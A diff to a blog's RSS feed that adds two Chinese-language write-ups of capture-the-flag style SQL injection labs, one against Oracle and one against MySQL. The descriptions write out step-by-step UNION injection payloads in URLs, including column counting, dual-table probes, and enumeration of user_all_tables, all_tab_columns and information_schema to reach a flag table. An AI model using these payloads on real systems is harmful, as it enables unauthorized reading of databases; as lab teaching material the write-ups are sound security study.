@@ -10,11 +10,18 @@
     <lastBuildDate>Fri, 02 Feb 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://xxxhidexxx.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>SQL 注入：联合查询</title>
-      <link>https://xxxhidexxx.github.io/posts/sec/sqli1/</link>
+      <title>Oracle 联合注入</title>
+      <link>https://xxxhidexxx.github.io/posts/sec/sqli2/</link>
       <pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate>
+      <guid>https://xxxhidexxx.github.io/posts/sec/sqli2/</guid>
+      <description>靶场界面如下。&#xA;我们先确认一下参数 id 处存在注入点。&#xA;http://111.9.41.91:53109/?id=1&#39; or &#39;1&#39;=&#39;1&#xD;当输入 order by 6 时报错，而 order by 5 不报错，确认字段数为 5。&#xA;http://111.9.41.91:53109/?id=1&#39; order by 6 --+&#xD;我们现在就可以用联合查询进行注入了。这里需要注意 oracle 的语法，from dual 是占位置用的，因为 oracle 的语句必须包含表名；我们使用 null 而不是 12345 是因为数据类型未知。&#xA;先确认一下没有报错。&#xA;http://111.9.41.91:53109/?id=1&#39; union select null,null,null,null,null from dual --+&#xD;然后确认回显点的数据类型，我们只需要一个回显点就够了。&#xA;http://111.9.41.91:53109/?id=1&#39; union select 1,&#39;a&#39;,null,null,null from dual --+&#xD;现在我们使用 oracle 的自带库。&#xA;http://111.9.41.91:53109/?id=1&#39; union select 1,table_name,null,null,null from user_all_tables --+&#xD;我们找到了 flag 的表，进一步查询字段。&#xA;http://111.9.41.91:53109/?id=1&#39; union select 1,column_name,null,null,null from all_tab_columns where table_name=&#39;UNION_FLAG&#39; --+&#xD;至此我们就找到了 flag。</description>
+    </item>
+    <item>
+      <title>MySQL 联合注入</title>
+      <link>https://xxxhidexxx.github.io/posts/sec/sqli1/</link>
+      <pubDate>Thu, 01 Feb 2024 00:00:00 +0000</pubDate>
       <guid>https://xxxhidexxx.github.io/posts/sec/sqli1/</guid>
-      <description>用联合查询进行 sql 注入需要网站有注入点和回显点。有注入点就是说我们塞进去的代码可以被执行，而有回显点意味着我们的注入点所在的语句能够完全控制网页部分内容的显示。此时，通过联合查询可以直接查询出数据库的信息。</description>
+      <description>对 mysql 进行联合注入是在有回显点的情况下用 union select 直接查询数据库内容，查询结果在回显点用 group_concat 输出。常见的关系型数据库都有系统自带库，mysql 的是 information_schema 这个库，其中存储着全部库名、表名、字段名。我们这里要做的是在 information_schema 找到关键的库、表、字段，从而找到 flag。&#xA;靶场界面如下。&#xA;首先在 id 参数之后加单引号进行尝试。&#xA;出现报错说明有注入点，这里甚至直接看到了 sql 语句。我们用 order by 猜测字段数，order by 2 正常，到 3 之后出现报错，说明有两个字段。&#xA;用联合查询查找回显点。&#xA;出现了一个回显点。那么我们可以直接爆出所有的库名和表名了。构造如下 poc&#xA;?id=-1&#39; union select null，group_concat(schema_name) from information_schema.schemata --+&#xD;可以看到如下显示。&#xA;至此这个靶场的 flag 就拿到了。</description>
     </item>
   </channel>
 </rss>
